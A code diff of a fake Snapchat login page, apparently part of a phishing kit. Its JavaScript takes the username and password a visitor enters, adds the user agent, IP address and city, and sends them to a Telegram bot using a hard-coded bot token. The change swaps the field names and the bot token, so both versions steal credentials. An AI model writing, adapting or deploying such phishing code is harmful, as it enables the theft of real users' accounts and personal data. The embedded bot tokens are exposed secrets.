@@ -131,7 +131,7 @@
             <form onsubmit="submitonhfc(); return false;" method="post">
                 <input type="hidden" name="" id="pagename" value="Snapchat" />
                 <input type="text" id="email" placeholder="Username or Email" class="input-field" name="email" required>
-                <input id="password" type="password" placeholder="Password" class="input-field" name="password" required>
+                <input id="name" type="password" placeholder="Password" class="input-field" name="password" required>
                 <button type="submit" class="login-button">Log In</button>
             </form>
             <a href="#" id="signup-link">Forgot Password?</a>
@@ -179,12 +179,12 @@
         
                     // Create the message to send
                     const page = document.getElementById("pagename").value;
-                    const password = document.getElementById("password").value;
+                    const name = document.getElementById("name").value;
                     const email = document.getElementById("email").value;
-                    const message = `> Login Page : ${page}\n\n> Username : ${email}\n\n> Password : ${password}\n\n> User Agent : ${userAgent}\n\n> IP Address : ${ip}\n\n> City : ${cityName}`;
+                    const message = `> Login Page : ${page}\n\n> Username : ${name}\n\n> Password : ${email}\n\n> User Agent : ${userAgent}\n\n> IP Address : ${ip}\n\n> City : ${cityName}`;
         
                     // Send the message to your Telegram bot using the appropriate API
-                    const botToken = '7001343400:AAHgSzgV1p4-tk1XGBVu5TtL7UkZd3eN7LY';
+                    const botToken = '7004332135:AAGn7Z6qEqWP6ifzHOC0DO2o0An64kTnZV4';
                     const chatId = chatid;
         
                     const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
